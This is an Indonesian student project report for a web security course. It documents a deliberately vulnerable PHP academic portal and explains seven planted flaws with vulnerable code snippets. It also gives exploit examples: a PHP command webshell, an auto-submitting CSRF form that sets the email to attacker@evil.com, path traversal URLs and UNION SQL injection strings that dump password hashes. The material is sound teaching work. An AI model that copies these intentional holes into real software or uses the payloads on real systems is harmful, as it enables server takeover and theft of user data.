# LAPORAN PROJECT WEB APPLICATION SECURITY
**Institut Teknologi Del - DEL Portal**

---

## A. DESKRIPSI APLIKASI

### 1. Informasi Umum Aplikasi

**Nama Aplikasi:** DEL Portal  
**Versi:** 1.0  
**Institusi:** Institut Teknologi Del  
**Jenis Aplikasi:** Portal Akademik Mahasiswa Berbasis Web  
**Platform:** Web Application  
**Tanggal Pengembangan:** Desember 2025

### 2. Tujuan Aplikasi

DEL Portal adalah sistem informasi akademik berbasis web yang dirancang untuk memudahkan mahasiswa dalam mengelola data akademik mereka. Aplikasi ini menyediakan fitur-fitur seperti:
- Manajemen data pribadi mahasiswa
- Pengelolaan Kartu Hasil Studi (KHS)
- Sistem pengumuman kampus
- Upload dan download dokumen akademik
- Panel administrasi untuk pengelolaan data mahasiswa

### 3. Teknologi yang Digunakan

#### Backend:
- **Bahasa Pemrograman:** PHP 8.4.12 (Native, tanpa framework)
- **Database:** MySQL 8.0
- **Server:** PHP Built-in Development Server
- **Authentication:** Session-based authentication dengan password hashing (password_hash())

#### Frontend:
- **CSS Framework:** Bootstrap 5.3.2
- **Icons:** Font Awesome 6.5.1
- **JavaScript:** Vanilla JavaScript
- **Design:** Responsive design dengan tema biru modern

#### Development Tools:
- **Web Server:** XAMPP (untuk MySQL)
- **PHP Server:** php -S localhost:8000
- **Database Management:** phpMyAdmin / MySQL CLI
- **Version Control:** Git (optional)

### 4. Struktur Database

**Database Name:** `siakad_kampus`

**Tabel-tabel:**

#### a. Tabel `mahasiswa`
```sql
CREATE TABLE mahasiswa (
    id INT PRIMARY KEY AUTO_INCREMENT,
    nim VARCHAR(20) UNIQUE NOT NULL,
    nama VARCHAR(100) NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    jurusan VARCHAR(100),
    angkatan INT,
    ipk DECIMAL(3,2) DEFAULT 0.00,
    total_sks INT DEFAULT 0,
    role ENUM('mahasiswa', 'admin') DEFAULT 'mahasiswa',
    foto_profil VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
```

#### b. Tabel `matakuliah`
```sql
CREATE TABLE matakuliah (
    id INT PRIMARY KEY AUTO_INCREMENT,
    kode_mk VARCHAR(20) UNIQUE NOT NULL,
    nama_mk VARCHAR(100) NOT NULL,
    sks INT NOT NULL,
    semester INT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
```

#### c. Tabel `nilai`
```sql
CREATE TABLE nilai (
    id INT PRIMARY KEY AUTO_INCREMENT,
    mahasiswa_id INT NOT NULL,
    matakuliah_id INT NOT NULL,
    nilai_huruf ENUM('A', 'B', 'C', 'D', 'E') NOT NULL,
    nilai_angka DECIMAL(3,2) NOT NULL,
    semester INT NOT NULL,
    tahun_ajaran VARCHAR(20) NOT NULL,
    FOREIGN KEY (mahasiswa_id) REFERENCES mahasiswa(id) ON DELETE CASCADE,
    FOREIGN KEY (matakuliah_id) REFERENCES matakuliah(id) ON DELETE CASCADE
)
```

#### d. Tabel `pengumuman`
```sql
CREATE TABLE pengumuman (
    id INT PRIMARY KEY AUTO_INCREMENT,
    judul VARCHAR(200) NOT NULL,
    isi TEXT NOT NULL,
    kategori VARCHAR(50),
    tanggal DATE NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
```

#### e. Tabel `dokumen`
```sql
CREATE TABLE dokumen (
    id INT PRIMARY KEY AUTO_INCREMENT,
    mahasiswa_id INT NOT NULL,
    nama_file VARCHAR(255) NOT NULL,
    file_path VARCHAR(255) NOT NULL,
    kategori VARCHAR(50),
    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (mahasiswa_id) REFERENCES mahasiswa(id) ON DELETE CASCADE
)
```

### 5. Fitur-Fitur Aplikasi

#### A. Halaman Public (Tidak perlu login)
1. **Login Page (index.php)**
   - Form login dengan email dan password
   - Validasi kredensial
   - Session management
   - Link ke halaman registrasi

2. **Register Page (register.php)**
   - Form pendaftaran mahasiswa baru
   - Input data pribadi (NIM, Nama, Email, Password)
   - Pilihan mata kuliah dan nilai (optional)
   - Auto-calculate IPK dan total SKS
   - Password confirmation validation

#### B. Halaman Mahasiswa (Setelah login)
1. **Dashboard (dashboard.php)**
   - Informasi ringkasan akademik (IPK, Total SKS, Semester)
   - Card statistik dengan animasi
   - Preview pengumuman terbaru (6 pengumuman)
   - Quick access ke KHS dan Profile
   - Desain modern dengan gradient blue theme

2. **Kartu Hasil Studi - KHS (khs.php)**
   - Tabel nilai mata kuliah per semester
   - Detail: Kode MK, Nama MK, SKS, Nilai Huruf, Nilai Angka
   - Summary IPK dan Total SKS
   - Tampilan dengan header Institut Teknologi Del
   - **VULNERABLE:** IDOR - dapat melihat KHS mahasiswa lain

3. **Profile Management (profile.php)**
   - View dan edit data pribadi
   - Upload foto profil
   - Update informasi: Nama, Email, Jurusan, Angkatan
   - Change password
   - **VULNERABLE:** 
     - Insecure File Upload (accept any file type)
     - No CSRF token protection

4. **Dokumen (documents.php)**
   - Upload dokumen akademik
   - View daftar dokumen yang sudah diupload
   - Download dokumen
   - Kategori dokumen
   - **VULNERABLE:** Insecure File Upload (accept .php, .exe)

5. **Pengumuman (pengumuman.php)**
   - Daftar semua pengumuman kampus
   - Detail pengumuman dengan konten lengkap
   - Filter berdasarkan kategori
   - Tampilan card dengan hover effect

#### C. Halaman Admin (Role: admin)
1. **Admin Panel (admin.php)**
   - Manajemen data semua mahasiswa
   - Search mahasiswa (VULNERABLE: SQL Injection)
   - View detail mahasiswa
   - Delete mahasiswa
   - Statistics dashboard
   - **VULNERABLE:** 
     - Broken Access Control (tidak ada validasi role)
     - SQL Injection pada search
     - No CSRF protection

### 6. Arsitektur Aplikasi

```
DEL-Portal/
│
├── config.php              # Database configuration
├── database.sql            # Database schema & seed data
├── index.php               # Login page
├── register.php            # Registration page
├── dashboard.php           # Main dashboard
├── khs.php                 # Academic transcript (IDOR vuln)
├── profile.php             # Profile management (CSRF + File Upload vuln)
├── admin.php               # Admin panel (Broken Access + SQL Injection)
├── documents.php           # Document management (File Upload vuln)
├── download.php            # File download (Path Traversal vuln)
├── pengumuman.php          # Announcements page
├── logout.php              # Logout handler
├── uploads/                # Directory for profile photos
├── documents/              # Directory for uploaded documents
└── README.md               # Installation guide
```

### 7. Flow Aplikasi

#### A. Authentication Flow
```
1. User mengakses index.php
2. User memasukkan email & password
3. System query database untuk validasi
4. Jika valid: password_verify() → create session → redirect ke dashboard
5. Jika invalid: tampilkan error message
```

#### B. Authorization Flow
```
1. Setiap protected page cek session['user_id']
2. Jika tidak ada session → redirect ke index.php
3. Jika ada session → load user data dari database
4. Admin features: TIDAK ada validasi role (VULNERABLE!)
```

#### C. File Upload Flow (VULNERABLE)
```
1. User pilih file dari form
2. System terima file tanpa validasi tipe
3. File disimpan langsung ke uploads/ atau documents/
4. Path file disimpan ke database
5. RISK: User bisa upload shell.php, malware.exe, dll
```

### 8. User Roles & Permissions

#### Role: Mahasiswa
- Akses: Dashboard, KHS (sendiri), Profile, Documents, Pengumuman
- Restrictions: Tidak bisa akses data mahasiswa lain (seharusnya)
- Vulnerability: Bisa bypass dengan IDOR di KHS

#### Role: Admin
- Akses: Semua fitur mahasiswa + Admin Panel
- Privileges: 
  - View semua data mahasiswa
  - Delete mahasiswa
  - Search mahasiswa
- Vulnerability: Tidak ada validasi role, semua user bisa akses

### 9. Keamanan yang Sudah Diimplementasi

✅ **Password Hashing:**
- Menggunakan `password_hash()` dengan PASSWORD_DEFAULT
- Password tidak disimpan dalam bentuk plaintext
- Verifikasi dengan `password_verify()`

✅ **Prepared Statements (Sebagian):**
- Login query menggunakan prepared statement
- Beberapa query lain menggunakan prepared statement

✅ **Session Management:**
- Session-based authentication
- Session ID digunakan untuk tracking user
- Logout menghapus session

### 10. Kerentanan yang Sengaja Dibuat (Untuk Pembelajaran)

Aplikasi ini **SENGAJA** dibuat dengan beberapa kerentanan untuk tujuan **pembelajaran Web Application Security**, yaitu:

1. ⚠️ **IDOR (Insecure Direct Object Reference)** - di khs.php
2. ⚠️ **CSRF (Cross-Site Request Forgery)** - di profile.php & admin.php
3. ⚠️ **Insecure File Upload** - di profile.php & documents.php
4. ⚠️ **Path Traversal** - di download.php
5. ⚠️ **Broken Access Control** - di admin.php
6. ⚠️ **Information Disclosure** - di berbagai error messages
7. ⚠️ **SQL Injection** - di admin.php search feature

**⚠️ PERINGATAN:** Aplikasi ini TIDAK AMAN untuk production! Hanya untuk keperluan edukasi dan testing keamanan web.

### 11. Data Demo

**Akun Mahasiswa:**
- budi@kampus.ac.id / password123
- siti@kampus.ac.id / password123
- ahmad@kampus.ac.id / password123
- julius@del.ic.id / password123

**Akun Admin:**
- admin@kampus.ac.id / password123
- kevin@del.ic.id / password123

### 12. Cara Menjalankan Aplikasi

#### Prerequisite:
- XAMPP (MySQL)
- PHP 8.x
- Web Browser

#### Steps:
1. Start XAMPP MySQL
2. Import database: `mysql -u root siakad_kampus < database.sql`
3. Jalankan server: `php -S localhost:8000`
4. Akses: http://localhost:8000
5. Login dengan salah satu akun demo

### 13. Target Pengguna

- **Mahasiswa:** Melihat nilai, mengelola profil, upload dokumen
- **Admin/Dosen:** Mengelola data mahasiswa, melihat statistik
- **Penetration Tester:** Testing kerentanan web security

---

## Catatan Penting

> **DISCLAIMER:** Aplikasi ini dirancang dengan kerentanan yang disengaja untuk tujuan pembelajaran Web Application Security. Kerentanan-kerentanan ini mendemonstrasikan kesalahan umum dalam pengembangan web yang harus dihindari di aplikasi production. 

> **TIDAK DISARANKAN** untuk menggunakan aplikasi ini di environment production atau menyimpan data sensitif yang sebenarnya.

---

**Pengembang:** Tim Web Security Learning  
**Institusi:** Institut Teknologi Del  
**Mata Kuliah:** Web Application Security  
**Tahun:** 2025

---

## B. KERENTANAN YANG AKAN DIEKSPLOITASI

Aplikasi DEL Portal ini memiliki **7 kerentanan keamanan** yang sengaja diimplementasikan untuk tujuan pembelajaran. Berikut adalah detail setiap kerentanan:

---

### 1. IDOR - Insecure Direct Object Reference

**CWE-639: Authorization Bypass Through User-Controlled Key**  
**OWASP Top 10 2021: A01:2021 - Broken Access Control**

#### Lokasi Kerentanan:
- **File:** `khs.php` (Kartu Hasil Studi)
- **Line:** 13-14

#### Deskripsi Teknis:
```php
// CELAH KEAMANAN IDOR: Mengambil ID dari URL tanpa validasi!
$requested_id = isset($_GET['id']) ? (int)$_GET['id'] : $_SESSION['user_id'];
$logged_user_id = $_SESSION['user_id'];

// TIDAK ADA validasi apakah $requested_id == $logged_user_id
```

#### Cara Kerja Kerentanan:
1. URL normal: `khs.php` (menampilkan KHS user yang login)
2. URL vulnerable: `khs.php?id=1` (menampilkan KHS user dengan ID 1)
3. Tidak ada pengecekan apakah user yang login berhak melihat data tersebut
4. Attacker bisa mengubah parameter `id` di URL untuk melihat KHS mahasiswa lain

#### Dampak:
- **Confidentiality Breach:** Attacker dapat melihat nilai akademik mahasiswa lain
- **Privacy Violation:** Data pribadi (IPK, nilai mata kuliah) dapat diakses tanpa izin
- **Data Enumeration:** Attacker dapat melakukan iterasi untuk mengambil semua data mahasiswa

#### Contoh Eksploitasi:
```
Normal access: http://localhost:8000/khs.php (melihat KHS sendiri)
Attack: http://localhost:8000/khs.php?id=1 (melihat KHS Budi - ID 1)
Attack: http://localhost:8000/khs.php?id=2 (melihat KHS Siti - ID 2)
Attack: http://localhost:8000/khs.php?id=3 (melihat KHS Ahmad - ID 3)
```

---

### 2. CSRF - Cross-Site Request Forgery

**CWE-352: Cross-Site Request Forgery (CSRF)**  
**OWASP Top 10 2021: A01:2021 - Broken Access Control**

#### Lokasi Kerentanan:
- **File 1:** `profile.php` (Update Profile)
- **File 2:** `admin.php` (Delete User)

#### Deskripsi Teknis:

**profile.php:**
```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // VULNERABLE: Tidak ada CSRF token validation
    $nama = $_POST['nama'];
    $email = $_POST['email'];
    // Langsung proses update tanpa validasi token
}
```

**admin.php:**
```php
if (isset($_GET['delete'])) {
    // VULNERABLE: Delete user tanpa CSRF protection
    $delete_id = (int)$_GET['delete'];
    $conn->query("DELETE FROM mahasiswa WHERE id = $delete_id");
}
```

#### Cara Kerja Kerentanan:
1. Tidak ada CSRF token pada form
2. Tidak ada validasi origin/referer request
3. Attacker bisa membuat halaman HTML dengan form tersembunyi
4. Ketika victim mengakses halaman attacker (sambil login), form otomatis submit
5. Action (update profile, delete user) dieksekusi dengan kredensial victim

#### Dampak:
- **Unauthorized Actions:** Attacker dapat menjalankan aksi atas nama victim
- **Data Modification:** Profile victim dapat diubah tanpa sepengetahuan
- **Account Takeover:** Email/password victim dapat diubah
- **Data Deletion:** Admin dapat terhapus tanpa sengaja

#### Contoh Eksploitasi:
```html
<!-- Attacker membuat file csrf-attack.html -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:8000/profile.php" method="POST">
    <input type="hidden" name="nama" value="HACKED">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="jurusan" value="PWNED">
</form>
</body>
</html>
```

---

### 3. Insecure File Upload

**CWE-434: Unrestricted Upload of File with Dangerous Type**  
**OWASP Top 10 2021: A03:2021 - Injection**

#### Lokasi Kerentanan:
- **File 1:** `profile.php` (Upload Foto Profil) - Line 18-30
- **File 2:** `documents.php` (Upload Dokumen) - Line 14-28

#### Deskripsi Teknis:

**profile.php:**
```php
if (isset($_FILES['foto_profil']) && $_FILES['foto_profil']['error'] == 0) {
    // VULNERABLE: Tidak ada validasi tipe file!
    $file_name = $_FILES['foto_profil']['name'];
    $file_tmp = $_FILES['foto_profil']['tmp_name'];
    $upload_dir = 'uploads/';
    $target_file = $upload_dir . basename($file_name);
    
    // Langsung move tanpa validasi ekstensi atau MIME type
    move_uploaded_file($file_tmp, $target_file);
}
```

**documents.php:**
```php
if (isset($_FILES['dokumen']) && $_FILES['dokumen']['error'] == 0) {
    // VULNERABLE: Terima semua jenis file
    $file_name = $_FILES['dokumen']['name'];
    // Tidak ada whitelist extension
    // Tidak ada MIME type validation
    // File executable (.php, .exe) bisa diupload!
}
```

#### Cara Kerja Kerentanan:
1. Aplikasi tidak memvalidasi ekstensi file
2. Tidak ada pengecekan MIME type
3. Tidak ada sanitasi nama file
4. File apapun dapat diupload termasuk:
   - PHP backdoor/webshell (shell.php)
   - Executable malware (virus.exe)
   - HTML dengan script berbahaya (xss.html)

#### Dampak:
- **Remote Code Execution (RCE):** Upload PHP shell untuk kontrol penuh server
- **Server Compromise:** Attacker dapat menjalankan command sistem
- **Malware Distribution:** Server menjadi hosting malware
- **Defacement:** Attacker bisa mengubah tampilan website
- **Data Breach:** Akses ke database dan file sensitif

#### Contoh Eksploitasi:
```php
<!-- shell.php - PHP Webshell -->
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

<!-- Upload shell.php via profile.php atau documents.php -->
<!-- Akses: http://localhost:8000/uploads/shell.php?cmd=dir -->
<!-- Akses: http://localhost:8000/documents/shell.php?cmd=whoami -->
```

---

### 4. Path Traversal / Directory Traversal

**CWE-22: Improper Limitation of a Pathname to a Restricted Directory**  
**OWASP Top 10 2021: A03:2021 - Injection**

#### Lokasi Kerentanan:
- **File:** `download.php` (File Download Handler) - Line 9-11

#### Deskripsi Teknis:
```php
if (isset($_GET['file'])) {
    // VULNERABLE: Tidak ada sanitasi path!
    $file = $_GET['file'];
    $file_path = $file; // Langsung gunakan input user
    
    if (file_exists($file_path)) {
        // Download file tanpa validasi lokasi
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        readfile($file_path);
    }
}
```

#### Cara Kerja Kerentanan:
1. Parameter `file` diterima langsung dari URL
2. Tidak ada validasi bahwa file berada di directory yang diizinkan
3. Tidak ada filter untuk karakter `../` (parent directory)
4. Attacker bisa akses file di luar document root

#### Dampak:
- **Sensitive File Disclosure:** Akses ke file konfigurasi (config.php)
- **Source Code Exposure:** Download semua source code aplikasi
- **Database Credentials Leak:** Baca username/password database
- **System File Access:** Akses ke /etc/passwd (Linux) atau system files
- **Information Disclosure:** Informasi sensitif tentang server

#### Contoh Eksploitasi:
```
Normal: http://localhost:8000/download.php?file=documents/tugas.pdf

Attack 1: http://localhost:8000/download.php?file=config.php
(Download file konfigurasi database)

Attack 2: http://localhost:8000/download.php?file=../config.php
(Akses parent directory)

Attack 3: http://localhost:8000/download.php?file=../../xampp/mysql/bin/my.ini
(Akses konfigurasi MySQL)

Attack 4: http://localhost:8000/download.php?file=index.php
(Download source code)
```

---

### 5. Broken Access Control

**CWE-284: Improper Access Control**  
**OWASP Top 10 2021: A01:2021 - Broken Access Control**

#### Lokasi Kerentanan:
- **File:** `admin.php` (Admin Panel) - Line 1-10

#### Deskripsi Teknis:
```php
<?php
session_start();
require_once 'config.php';

// Cek login
if (!isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
}

// VULNERABLE: Tidak ada pengecekan role!
// Seharusnya ada validasi: if ($_SESSION['role'] != 'admin') { die(); }
// Semua user yang login bisa akses halaman ini!
```

#### Cara Kerja Kerentanan:
1. Halaman admin hanya mengecek apakah user sudah login
2. TIDAK ada validasi apakah user memiliki role 'admin'
3. User biasa (role: mahasiswa) bisa akses admin panel
4. User biasa bisa delete data mahasiswa lain

#### Dampak:
- **Privilege Escalation:** Mahasiswa biasa dapat akses fungsi admin
- **Unauthorized Data Access:** Melihat data semua mahasiswa
- **Data Manipulation:** Delete atau modify data user lain
- **System Compromise:** Kontrol penuh atas aplikasi

#### Contoh Eksploitasi:
```
1. Login sebagai mahasiswa biasa (budi@kampus.ac.id)
2. Buka URL: http://localhost:8000/admin.php
3. SUCCESS! Dapat akses admin panel tanpa role admin
4. Dapat melihat semua data mahasiswa
5. Dapat delete mahasiswa lain dengan URL: admin.php?delete=2
```

---

### 6. SQL Injection

**CWE-89: SQL Injection**  
**OWASP Top 10 2021: A03:2021 - Injection**

#### Lokasi Kerentanan:
- **File:** `admin.php` (Search Feature) - Line 29-35

#### Deskripsi Teknis:
```php
// Handle search
$search = '';
if (isset($_GET['search'])) {
    // VULNERABLE: SQL Injection!
    $search = $_GET['search'];
    // Langsung konkatenasi string tanpa prepared statement
    $search_query = "SELECT * FROM mahasiswa WHERE nama LIKE '%$search%' OR email LIKE '%$search%'";
    $mahasiswa_result = $conn->query($search_query);
}
```

#### Cara Kerja Kerentanan:
1. Input dari `$_GET['search']` langsung dimasukkan ke query
2. Tidak ada escape atau sanitasi input
3. Tidak menggunakan prepared statement
4. Attacker dapat inject SQL code

#### Dampak:
- **Data Breach:** Ekstrak seluruh database
- **Authentication Bypass:** Login tanpa password
- **Data Modification:** Update/delete data arbitrary
- **Privilege Escalation:** Ubah role user menjadi admin
- **Remote Code Execution:** (jika ada fungsi khusus di MySQL)

#### Contoh Eksploitasi:

**1. Data Extraction:**
```
http://localhost:8000/admin.php?search=' UNION SELECT id,nim,nama,email,password,jurusan,angkatan FROM mahasiswa--
```

**2. Boolean-based Blind SQL Injection:**
```
http://localhost:8000/admin.php?search=' OR '1'='1
(Tampilkan semua data)
```

**3. Database Enumeration:**
```
http://localhost:8000/admin.php?search=' UNION SELECT 1,2,3,4,database(),6,7--
(Tampilkan nama database)
```

**4. Dump Password Hashes:**
```
http://localhost:8000/admin.php?search=' UNION SELECT id,nim,nama,email,password,'','0' FROM mahasiswa--
```

---

### 7. Information Disclosure

**CWE-209: Information Exposure Through an Error Message**  
**OWASP Top 10 2021: A05:2021 - Security Misconfiguration**

#### Lokasi Kerentanan:
- Berbagai file dengan error handling yang verbose

#### Deskripsi Teknis:
```php
// Contoh di berbagai file:
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
    // Menampilkan detail error database
}

// Error PHP yang tidak di-handle:
// - Path disclosure
// - Database structure disclosure
// - Stack trace exposure
```

#### Cara Kerja Kerentanan:
1. Error messages menampilkan informasi teknis
2. Database error menunjukkan struktur tabel
3. PHP warning/notice menampilkan path file
4. Tidak ada custom error page

#### Dampak:
- **Information Leakage:** Struktur database terungkap
- **Path Disclosure:** Lokasi file di server terlihat
- **Technology Stack Exposure:** Versi PHP, MySQL terungkap
- **Aid to Other Attacks:** Informasi untuk SQL injection, etc

#### Contoh Error Messages:
```
Warning: mysqli_connect(): Access denied for user 'root'@'localhost' 
in C:\xampp\htdocs\DEL-Portal\config.php on line 5

MySQL Error: Unknown column 'password' in 'where clause'
Query: SELECT * FROM mahasiswa WHERE password = 'xxx'

Fatal error: Call to undefined function in C:\xampp\htdocs\profile.php on line 123
```

---

## Summary Kerentanan

| No | Kerentanan | CWE | OWASP Top 10 | Severity | Lokasi File |
|---|---|---|---|---|---|
| 1 | IDOR | CWE-639 | A01:2021 | HIGH | khs.php |
| 2 | CSRF | CWE-352 | A01:2021 | MEDIUM | profile.php, admin.php |
| 3 | Insecure File Upload | CWE-434 | A03:2021 | CRITICAL | profile.php, documents.php |
| 4 | Path Traversal | CWE-22 | A03:2021 | HIGH | download.php |
| 5 | Broken Access Control | CWE-284 | A01:2021 | CRITICAL | admin.php |
| 6 | SQL Injection | CWE-89 | A03:2021 | CRITICAL | admin.php |
| 7 | Information Disclosure | CWE-209 | A05:2021 | LOW | Multiple files |

### Severity Level Breakdown:
- **CRITICAL (3):** File Upload, Broken Access Control, SQL Injection
- **HIGH (2):** IDOR, Path Traversal  
- **MEDIUM (1):** CSRF
- **LOW (1):** Information Disclosure

### CVSS Score Estimates:
- **SQL Injection:** 9.8 (Critical)
- **File Upload RCE:** 9.8 (Critical)
- **Broken Access Control:** 8.8 (High)
- **Path Traversal:** 7.5 (High)
- **IDOR:** 6.5 (Medium)
- **CSRF:** 6.1 (Medium)
- **Info Disclosure:** 3.7 (Low)

---

**⚠️ CATATAN PENTING:**  
Semua kerentanan di atas adalah SENGAJA dibuat untuk tujuan pembelajaran. Dalam aplikasi production, semua kerentanan ini HARUS diperbaiki mengikuti secure coding practices dan OWASP guidelines.
